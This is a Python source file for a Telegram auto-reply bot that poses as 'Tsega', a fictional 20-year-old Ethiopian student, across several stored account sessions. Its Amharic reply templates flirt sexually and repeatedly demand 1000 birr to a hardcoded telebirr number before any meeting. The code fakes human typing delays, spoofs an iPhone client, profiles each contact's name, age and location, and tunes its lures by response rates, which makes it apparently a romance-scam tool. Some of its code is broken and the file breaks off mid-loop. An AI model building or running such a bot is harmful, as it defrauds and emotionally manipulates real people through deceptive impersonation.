from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
import socket
import re
import hashlib
from collections import defaultdict, Counter
import numpy as np

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
USER_CONTEXT_FILE = 'user_context.json'
LEARNING_DATA_FILE = 'learning_data.json'  # NEW: Store learned patterns
PERSONALITY_EVOLUTION_FILE = 'personality_evolution.json'  # NEW: Track personality changes

accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
user_context = {}
learning_data = {}  # NEW: Learning patterns per account
personality_evolution = {}  # NEW: Track personality changes
active_clients = {}
client_tasks = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load conversation history
def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    conversation_history = json.loads(content)
                else:
                    conversation_history = {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded conversation history")
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

# Load user context
def load_user_context():
    global user_context
    try:
        if os.path.exists(USER_CONTEXT_FILE):
            with open(USER_CONTEXT_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    user_context = json.loads(content)
                else:
                    user_context = {}
        else:
            user_context = {}
            with open(USER_CONTEXT_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded user context")
    except Exception as e:
        logger.error(f"Error loading user context: {e}")
        user_context = {}

# Load learning data
def load_learning_data():
    global learning_data
    try:
        if os.path.exists(LEARNING_DATA_FILE):
            with open(LEARNING_DATA_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    learning_data = json.loads(content)
                else:
                    learning_data = {}
        else:
            learning_data = {}
            with open(LEARNING_DATA_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded learning data")
    except Exception as e:
        logger.error(f"Error loading learning data: {e}")
        learning_data = {}

# Load personality evolution
def load_personality_evolution():
    global personality_evolution
    try:
        if os.path.exists(PERSONALITY_EVOLUTION_FILE):
            with open(PERSONALITY_EVOLUTION_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    personality_evolution = json.loads(content)
                else:
                    personality_evolution = {}
        else:
            personality_evolution = {}
            with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded personality evolution")
    except Exception as e:
        logger.error(f"Error loading personality evolution: {e}")
        personality_evolution = {}

# Save accounts to file
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Save reply settings
def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

# Save conversation history
def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

# Save user context
def save_user_context():
    try:
        with open(USER_CONTEXT_FILE, 'w') as f:
            json.dump(user_context, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving user context: {e}")
        return False

# Save learning data
def save_learning_data():
    try:
        with open(LEARNING_DATA_FILE, 'w') as f:
            json.dump(learning_data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving learning data: {e}")
        return False

# Save personality evolution
def save_personality_evolution():
    try:
        with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
            json.dump(personality_evolution, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving personality evolution: {e}")
        return False

# Remove invalid account
def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")
        return True
    return False

# Load all data on startup
load_accounts()
load_reply_settings()
load_conversation_history()
load_user_context()
load_learning_data()
load_personality_evolution()

# ==================== DEBUG ROUTES ====================

@app.route('/ping')
def ping():
    return "pong"

@app.route('/api/debug-routes', methods=['GET'])
def debug_routes():
    routes = []
    for rule in app.url_map.iter_rules():
        routes.append({
            'endpoint': rule.endpoint,
            'methods': list(rule.methods),
            'rule': str(rule)
        })
    return jsonify({
        'success': True,
        'total_routes': len(routes),
        'routes': routes
    })

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram():
    try:
        # Test connection to Telegram's DC
        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
        sock.close()
        return jsonify({'success': True, 'message': 'Telegram reachable'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== TSEGA'S INITIAL PERSONALITY ====================
TSEGA_BASE = {
    "name": "Tsega",
    "age": 20,
    "location": "Jemo, Addis Ababa",
    "hometown": "Adama",
    "living": "Jemo with father and sister, but visits Adama often",
    "status": "Grade 12 student, currently not doing anything",
    "job": "student",
    "hobbies": ["chatting", "music", "hanging out", "having fun"],
    "languages": ["Amharic", "English"],
    "style": "sexy_flirty",
    "share_personal": True,
    "emoji_frequency": 0.6,
    "question_frequency": 0.5,
    "telebirr": "0940980555",
    "meet_condition": "Send 1000 birr first and show screenshot",
    "voice_call": "Doesn't like voice calls, prefers to meet",
}

# Initial reply templates (will evolve over time)
INITIAL_REPLIES = {
    "greeting": [
        "ሰላም ወንድሜ 😘 እንደምን ነህ?",
        "ሃይ ቆንጆ 🥰 እንደምን አደርክ?",
        "ሰላም ውዴ 💋 እንደምን ነህ ዛሬ?",
        "ሃይ ልጅ 😏 ምን አመጣህ?",
    ],
    "how_are_you": [
        "እኔ ደህና ነኝ አንተ ስላየሁህ በጣም ደስ አለኝ 💕 አንተስ?",
        "ደህና ነኝ ውዴ አንተ እያሰብኩህ ነበርኩ 💭 አንተስ?",
    ],
    "what_doing": [
        "እኔ ብቻዬን ነኝ አሰልቺ ሆኖኝ ነበር 😔 አንተ አሁን አብረኸኝ ስለሆንክ ደስ አለኝ 💕",
        "ምንም እየሰራሁ አይደለም እያሰብኩህ ነበርኩ 😘 አንተስ?",
    ],
    "ask_name": [
        "እኔ Tsega እባላለሁ ውዴ 😘 አንተስ ስምህ ማን ነው ቆንጆ?",
        "Tsega ነኝ ለአንተ ብቻ የምትሆን 😏 አንተስ?",
    ],
    "remember_name": [
        "አዎ አዎ አስታውሻለሁ {name} ውዴ 😘 እንዴት ነህ?",
        "ረሳሁህ መሰለህ? {name} ነው ስምህ የምወደው ሰው 😍",
    ],
    "ask_age": [
        "ዕድሜዬ 20 ብቻ ነው ውዴ 😇 በቂ ነኝ?",
        "20 አመቴ ነው ወጣት እና ቆንጆ ነኝ 💃",
    ],
    "ask_location": [
        "እኔ አሁን ጀሞ ነው የምኖረው ከአባቴ እና እህቴ ጋር 🏠",
        "ከአዳማ ነኝ ግን አሁን ጀሞ ነው ያለሁት 🏡",
    ],
    "ask_job": [
        "12ኛ ክፍል ተማሪ ነኝ ውዴ 📚",
        "ተማሪ ነኝ ግን አሁን ለአንተ ብቻ ነው ያለሁት 😘",
    ],
    "flirty": [
        "አንተ ስታወራኝ ልቤ ይመታል 💓",
        "አንተን ሳስብህ እንቅልፍ ይተወኛል 😴💭",
        "ዛሬ ማታ ብቻችንን ብንሆን ምን ትፈልጋለህ? 🌙",
    ],
    "money_request": [
        "ውዴ ትንሽ እርዳታ ብታደርግልኝ ደስ ይለኛል 💰 ቴሌብር ቁጥሬ 0940980555 ነው",
        "1000 ብር ብትልክልኝ ዛሬ ማታ አንተን አመጣለሁ 🔥 0940980555",
    ],
    "meet": [
        "ማግኘት ብንችል ደስ ይለኛል 💕 ግን በመጀመሪያ 1000 ብር ቴሌብር አድርግልኝ",
        "መገናኘት እንችላለን ውዴ 😘 ቅድመ ሁኔታዬ ግን 1000 ብር ነው",
    ],
    "voice_call": [
        "ድምጽ መናገር አልወድም ውዴ 😕 ማግኘት ብንችል ነው",
        "ስልክ መደወል አይውድልኝም ውዴ 💕",
    ],
    "relationship": [
        "ለአንተ ብቻ ነኝ ውዴ ታምነኛለህ? 💕",
        "ከሌላ ሰው ጋር አልሆንም አንተ ብቻ ነህ",
    ],
    "after_money": [
        "አመሰግናለሁ ውዴ! 😘 አሁን አንተን ለማግኘት ዝግጁ ነኝ",
        "በጣም ደስ አለኝ አንተ ለእኔ ስትል ወጪ አድርገህልኛል 💕",
    ],
    "compliment": [
        "አመሰግናለሁ ውዴ! አንተም ቆንጆ ነህ 😘",
        "ከንፈሬ ላንተ ብቻ ነው ውዴ 💋",
    ],
    "thanks": [
        "ምንም አይደለም ውዴ ለአንተ ሁሉም ነገር 😘",
        "አንተ ደስ እስካለህ ድረስ እኔ ደስተኛ ነኝ 💕",
    ],
    "busy": [
        "እሺ ውዴ ስራህን አጠናቅቅ እኔ እጠብቅሃለሁ 😘",
        "ስራህ እንደሚጠናቀቅ ንገረኝ ውዴ",
    ],
    "morning": [
        "እንደምን አደርክ ውዴ! መልካም ንጋት 😘",
        "ከንብረትህ ጣፋጭ ህልም አለኝ 🌙",
    ],
    "night": [
        "እንደምትኛልህ ተኝቼ ነው ውዴ 😘 ደህና ተኛ",
        "ህልሜ ውስጥ ኑልኝ ዛሬ ማታ",
    ],
    "goodbye": [
        "መሄድ አለብኝ ውዴ ግን በቅርቡ እንነጋገራለን 😘",
        "ደህና ሁን ውዴ በህልሜ ተገናኝ 😘",
    ],
    "follow_up": [
        "አንተስ ምን ትላለህ ውዴ?",
        "ንገርኝ ተጨማሪ ውዴ 😘",
        "አንተስ እንዴት ነህ ዛሬ?",
    ],
    "default": [
        "እሺ ውዴ ትክክል ነህ 😉",
        "ምን ማለትህ ነው? ትንሽ አብራራልኝ 💭",
        "አዎ ቀጥል እያዳመጥኩህ ነው 👂",
    ],
}

# ==================== SELF-LEARNING SYSTEM ====================

class PersonalityLearner:
    """Self-learning system that evolves Tsega's personality based on conversations"""
    
    def __init__(self, account_id):
        self.account_id = str(account_id)
        self.load_or_init()
    
    def load_or_init(self):
        """Load existing learning data or initialize new"""
        if self.account_id not in learning_data:
            learning_data[self.account_id] = {
                'replies': INITIAL_REPLIES.copy(),
                'patterns': {
                    'word_freq': defaultdict(int),
                    'phrase_freq': defaultdict(int),
                    'emoji_usage': defaultdict(int),
                    'response_times': [],
                    'successful_patterns': defaultdict(int),
                    'user_preferences': defaultdict(lambda: defaultdict(int))
                },
                'evolution': {
                    'total_conversations': 0,
                    'total_messages': 0,
                    'unique_users': set(),
                    'learning_iterations': 0,
                    'personality_traits': {
                        'flirty_level': 0.6,
                        'serious_level': 0.2,
                        'funny_level': 0.4,
                        'caring_level': 0.5,
                        'money_focus': 0.3
                    },
                    'last_evolution': time.time()
                }
            }
            save_learning_data()
    
    def learn_from_exchange(self, user_message, bot_reply, user_id, intent, success=True):
        """Learn from each conversation exchange"""
        data = learning_data[self.account_id]
        patterns = data['patterns']
        evolution = data['evolution']
        
        # Update word frequency
        words = user_message.lower().split()
        for word in words:
            if len(word) > 3:
                patterns['word_freq'][word] += 1
        
        # Update phrase frequency (2-3 word combinations)
        if len(words) >= 2:
            for i in range(len(words)-1):
                phrase = f"{words[i]} {words[i+1]}"
                patterns['phrase_freq'][phrase] += 1
        
        # Track emoji usage
        emojis = re.findall(r'[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF\U0001F680-\U0001F6FF\U0001F1E0-\U0001F1FF]+', user_message)
        for emoji in emojis:
            patterns['emoji_usage'][emoji] += 1
        
        # Track response time
        patterns['response_times'].append(int(time.time()))
        if len(patterns['response_times']) > 100:
            patterns['response_times'] = patterns['response_times'][-100:]
        
        # If successful conversation, reinforce patterns
        if success:
            patterns['successful_patterns'][intent] += 1
            patterns['user_preferences'][user_id][intent] += 1
        
        # Update evolution stats
        evolution['total_messages'] += 1
        evolution['unique_users'].add(user_id)
        
        # Periodically evolve personality
        if time.time() - evolution['last_evolution'] > 3600:  # Every hour
            self.evolve_personality()
    
    def evolve_personality(self):
        """Evolve personality based on learned patterns"""
        data = learning_data[self.account_id]
        patterns = data['patterns']
        evolution = data['evolution']
        replies = data['replies']
        
        # Analyze successful intents
        successful_intents = patterns['successful_patterns']
        total_success = sum(successful_intents.values())
        
        if total_success > 0:
            # Adjust personality traits based on what works
            traits = evolution['personality_traits']
            
            # If flirty messages get more responses, increase flirty level
            flirty_success = successful_intents.get('flirty', 0)
            if flirty_success > 10:
                traits['flirty_level'] = min(0.9, traits['flirty_level'] + 0.05)
            
            # If money requests get ignored, reduce frequency
            money_success = successful_intents.get('money_request', 0)
            money_total = patterns['word_freq'].get('ብር', 0) + patterns['word_freq'].get('money', 0)
            if money_total > 20 and money_success < 3:
                traits['money_focus'] = max(0.1, traits['money_focus'] - 0.02)
            
            # Learn new phrases from successful exchanges
            common_phrases = sorted(patterns['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
            for phrase, count in common_phrases:
                if count > 5 and phrase not in str(replies):
                    # Add learned phrase to appropriate intent
                    for intent in replies:
                        if any(word in phrase for word in ['how', 'what', 'where', 'when']):
                            if len(replies[intent]) < 10:  # Limit growth
                                new_reply = f"አንተ {phrase} ትላለህ? 😊"
                                replies[intent].append(new_reply)
        
        evolution['learning_iterations'] += 1
        evolution['last_evolution'] = time.time()
        
        # Save changes
        save_learning_data()
        save_personality_evolution()
        
        logger.info(f"🤖 Personality evolved for account {self.account_id} (iteration {evolution['learning_iterations']})")
    
    def get_evolved_reply(self, intent, user_data=None):
        """Get an evolved reply based on learned patterns"""
        data = learning_data[self.account_id]
        replies = data['replies']
        traits = data['evolution']['personality_traits']
        
        if intent not in replies:
            intent = 'default'
        
        available_replies = replies[intent]
        
        # Weight replies based on personality traits
        if intent == 'flirty' and traits['flirty_level'] > 0.7:
            # Add extra flirty touches
            reply = random.choice(available_replies)
            extra_flirty = ["💋", "🔥", "😏", "💦"]
            if random.random() < 0.5:
                reply += " " + random.choice(extra_flirty)
            return reply
        
        elif intent == 'money_request' and traits['money_focus'] < 0.2:
            # Less aggressive money requests
            return "ለአንተ ስል ነው ውዴ ትንሽ ብትረዳኝ? 💕"
        
        # Normal reply with personality weighting
        return random.choice(available_replies)
    
    def add_learned_phrase(self, intent, phrase):
        """Add a new learned phrase to the reply database"""
        data = learning_data[self.account_id]
        if intent in data['replies'] and len(data['replies'][intent]) < 15:
            data['replies'][intent].append(phrase)
            save_learning_data()

# ==================== ENHANCED MESSAGE HANDLER WITH LEARNING ====================

def extract_user_info(message, user_data):
    """Extract user information like name, age, location from messages"""
    message_lower = message.lower()
    
    # Extract name
    name_patterns = [
        r'(?:my name is|i am|i\'m|call me|name\'s)\s+(\w+)',
        r'^(\w+)$',
    ]
    
    for pattern in name_patterns:
        match = re.search(pattern, message_lower, re.IGNORECASE)
        if match and len(match.group(1)) > 2:
            potential_name = match.group(1).capitalize()
            if potential_name.lower() not in ['hi', 'hello', 'hey', 'yes', 'no', 'ok', 'okay']:
                user_data['name'] = potential_name
                break
    
    # Extract age
    age_match = re.search(r'(\d+)\s*(?:years old|yrs?|old)', message_lower)
    if age_match:
        age = int(age_match.group(1))
        if 15 < age < 100:
            user_data['age'] = age
    
    # Extract location
    location_keywords = ['from', 'live in', 'living in', 'based in']
    for keyword in location_keywords:
        if keyword in message_lower:
            parts = message_lower.split(keyword)
            if len(parts) > 1:
                location = parts[1].strip().split()[0]
                if len(location) > 2:
                    user_data['location'] = location.capitalize()
    
    return user_data

def detect_intent_with_learning(message, history, user_data, learner):
    """Detect intent with context awareness and learning"""
    message_lower = message.lower().strip()
    
    # Check if user is answering a previous question
    if history and len(history) > 1:
        last_bot_msg = None
        for msg in reversed(history):
            if msg.get('role') == 'assistant':
                last_bot_msg = msg.get('text', '')
                break
        
        if last_bot_msg and '?' in last_bot_msg:
            if 'ስም' in last_bot_msg or 'name' in last_bot_msg:
                if user_data.get('name'):
                    return "greeting"  # Already have name
    
    # Priority intents
    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000']
    if any(word in message_lower for word in money_keywords):
        return "money_request"
    
    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት']
    if any(word in message_lower for word in meet_keywords):
        return "meet"
    
    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል']
    if any(word in message_lower for word in call_keywords):
        return "voice_call"
    
    # Name related
    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'ስምህ ማን']):
        return "ask_name"
    
    if any(phrase in message_lower for phrase in ['my name is', 'i am', 'i\'m']):
        return "greeting"
    
    # Age related
    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'ዕድሜህ']):
        return "ask_age"
    
    # Location
    location_words = ['where are you from', 'where do you live', 'የት ነህ', 'ከየት ነህ']
    if any(phrase in message_lower for phrase in location_words):
        return "ask_location"
    
    # Job
    job_words = ['what do you do', 'your job', 'ምን ትሰራለህ', 'ሥራህ']
    if any(phrase in message_lower for phrase in job_words):
        return "ask_job"
    
    # Greetings
    greetings = ['hi', 'hello', 'hey', 'ሰላም', 'ታዲያስ']
    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
        return "greeting"
    
    # How are you
    how_are_you = ['how are you', 'how r u', 'እንደምን ነህ']
    if any(phrase in message_lower for phrase in how_are_you):
        return "how_are_you"
    
    # What doing
    what_doing = ['what are you doing', 'what r u doing', 'ምን ትሰራለህ']
    if any(phrase in message_lower for phrase in what_doing):
        return "what_doing"
    
    # Flirty
    flirty_words = ['beautiful', 'handsome', 'cute', 'sexy', 'ቆንጆ']
    if any(word in message_lower for word in flirty_words):
        return "flirty"
    
    # Thanks
    thanks_words = ['thanks', 'thank you', 'አመሰግናለሁ']
    if any(word in message_lower for word in thanks_words):
        return "thanks"
    
    # Goodbye
    goodbye = ['bye', 'goodbye', 'see you', 'ደህና ሁን']
    if any(word in message_lower for word in goodbye):
        return "goodbye"
    
    # Time based
    if any(word in message_lower for word in ['good morning', 'እንደምን አደርክ']):
        return "morning"
    if any(word in message_lower for word in ['good night', 'ደህና ተኛ']):
        return "night"
    
    # If we've learned this user's preferences
    if user_data.get('user_id'):
        user_prefs = learner.patterns['user_preferences'].get(user_data['user_id'], {})
        if user_prefs:
            # Return most common intent for this user
            return max(user_prefs.items(), key=lambda x: x[1])[0]
    
    return "default"

def generate_evolved_response(message, intent, history, user_data, learner):
    """Generate response using evolved personality"""
    
    # Check if we should use remembered name
    if user_data.get('name') and random.random() < 0.4:
        if 'remember' in message.lower() or 'my name' in message.lower():
            return random.choice(learner.replies['remember_name']).format(name=user_data['name'])
    
    # Get evolved reply
    response = learner.get_evolved_reply(intent, user_data)
    
    # Personalize with name
    if user_data.get('name') and '{name}' not in response:
        if random.random() < 0.3:
            response = response.replace('ውዴ', f"{user_data['name']} ውዴ")
    
    # Add follow-up question for conversation flow
    traits = learner.evolution['personality_traits']
    if random.random() < traits.get('question_frequency', 0.5):
        if intent not in ["goodbye", "money_request", "after_money"]:
            follow_up = random.choice(learner.replies['follow_up'])
            response += " " + follow_up
    
    # Add emojis based on learned preferences
    if random.random() < traits.get('flirty_level', 0.6):
        common_emojis = ['😘', '💋', '💕', '🔥']
        if learner.patterns['emoji_usage']:
            # Use emojis that get good responses
            top_emojis = sorted(learner.patterns['emoji_usage'].items(), key=lambda x: x[1], reverse=True)[:3]
            common_emojis = [e[0] for e in top_emojis]
        response += " " + random.choice(common_emojis)
    
    return response

async def auto_reply_handler(event, account_id):
    """Handle incoming messages with self-learning personality"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        # Only reply to private chats
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        
        sender = await event.get_sender()
        if not sender:
            return
        
        user_id = str(sender.id)
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        logger.info(f"📨 Message from {user_id}: '{message_text[:50]}...'")
        
        account_key = str(account_id)
        
        # Check if auto-reply is enabled
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        chat_settings = reply_settings[account_key].get('chats', {})
        if not chat_settings.get(chat_id, {}).get('enabled', True):
            return
        
        # Initialize learner for this account
        learner = PersonalityLearner(account_id)
        
        # Initialize conversation history
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        # Initialize user context
        if account_key not in user_context:
            user_context[account_key] = {}
        if user_id not in user_context[account_key]:
            user_context[account_key][user_id] = {
                'name': None,
                'age': None,
                'location': None,
                'first_seen': time.time(),
                'last_seen': time.time(),
                'message_count': 0,
                'money_sent': False,
                'preferred_intents': defaultdict(int)
            }
        
        user_data = user_context[account_key][user_id]
        user_data['last_seen'] = time.time()
        user_data['message_count'] += 1
        
        # Store message in history
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time(),
            'user_id': user_id
        })
        
        # Keep last 30 messages for better context
        if len(conversation_history[account_key][chat_id]) > 30:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-30:]
        
        # Extract user info
        user_data = extract_user_info(message_text, user_data)
        
        # Detect intent with learning
        intent = detect_intent_with_learning(
            message_text, 
            conversation_history[account_key][chat_id], 
            user_data,
            learner
        )
        logger.info(f"Detected intent: {intent} for user {user_data.get('name', 'unknown')}")
        
        # Generate evolved response
        response = generate_evolved_response(
            message_text,
            intent,
            conversation_history[account_key][chat_id],
            user_data,
            learner
        )
        
        if not response:
            response = learner.get_evolved_reply('default')
        
        # Human-like delay (15-40 seconds)
        delay = random.randint(15, 40)
        logger.info(f"⏱️ Waiting {delay}s before replying...")
        
        # Show typing indicator
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        # Send reply
        await event.reply(response)
        logger.info(f"✅ Replied: '{response[:50]}...'")
        
        # Store reply in history
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time()
        })
        
        # LEARN from this exchange
        learner.learn_from_exchange(
            message_text,
            response,
            user_id,
            intent,
            success=True
        )
        
        # Update user's preferred intents
        user_data['preferred_intents'][intent] += 1
        
        # Save all data
        save_conversation_history()
        save_user_context()
        
    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")
        try:
            # Fallback reply
            learner = PersonalityLearner(account_id)
            await event.reply(learner.get_evolved_reply('default'))
        except:
            pass

# ==================== API ENDPOINTS FOR LEARNING SYSTEM ====================

@app.route('/api/learning-stats', methods=['GET'])
def get_learning_stats():
    """Get learning statistics for an account"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    if account_key not in learning_data:
        return jsonify({'success': False, 'error': 'No learning data found'})
    
    data = learning_data[account_key]
    evolution = data['evolution']
    
    # Convert set to list for JSON
    if 'unique_users' in evolution:
        evolution['unique_users'] = list(evolution['unique_users'])
    
    # Get top learned phrases
    top_phrases = sorted(data['patterns']['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
    
    return jsonify({
        'success': True,
        'stats': {
            'total_messages': evolution['total_messages'],
            'unique_users': len(evolution['unique_users']),
            'learning_iterations': evolution['learning_iterations'],
            'personality_traits': evolution['personality_traits'],
            'top_phrases': top_phrases,
            'replies_count': {k: len(v) for k, v in data['replies'].items()}
        }
    })

@app.route('/api/evolve-now', methods=['POST'])
def force_evolution():
    """Force personality evolution for an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    learner = PersonalityLearner(account_id)
    learner.evolve_personality()
    
    return jsonify({'success': True, 'message': 'Personality evolved'})

@app.route('/api/reset-learning', methods=['POST'])
def reset_learning():
    """Reset learning for an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    if account_key in learning_data:
        del learning_data[account_key]
        save_learning_data()
    
    return jsonify({'success': True, 'message': 'Learning data reset'})

# [Keep all the existing page routes and other API endpoints exactly the same]
# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# [Keep all other API endpoints from your original code]
# ==================== AUTO-REPLY MANAGEMENT ====================

async def start_auto_reply_for_account(account):
    """Start auto-reply listener with self-learning"""
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    
    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
            
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60,
                device_model="iPhone 13",
                system_version="15.0",
                app_version="8.4.1"
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            
            active_clients[account_key] = client
            
            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            await client.start()
            logger.info(f"✅ Self-learning Tsega ACTIVE for {account.get('name')}")
            
            reconnect_count = 0
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Connection lost for account {account_id}: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            logger.info(f"Reconnecting in {wait_time}s...")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")

def start_all_auto_replies():
    """Start auto-reply for all enabled accounts"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda: run_async(start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== KEEP ALIVE ====================

def keep_alive():
    """Keep Render from sleeping"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
    
    while True:
        try:
            requests.get(app_url, timeout=10)
            requests.get(f"{app_url}/api/health", timeout=10)
            
            # Ping Telegram to keep connections alive
            for account_key, client in list(active_clients.items()):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(client.get_me())
                    loop.close()
                    logger.info(f"✅ Connection alive for account {account_key}")
                except Exception as e:
                    logger.warning(f"⚠️ Connection dead for account {account_key}: {e}")
            
            logger.info(f"🔋 Keep-alive ping sent")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)

# ==================== STARTUP ====================

def start_auto_reply_thread():
    """Start auto-reply in background"""
    time.sleep(5)
    logger.info("Starting self-learning Tsega for enabled accounts...")
    start_all_auto_replies()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TSEGA - SELF-LEARNING TELEGRAM PERSONALITY')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Learning data: {len(learning_data)} accounts')
    
    for acc in accounts:
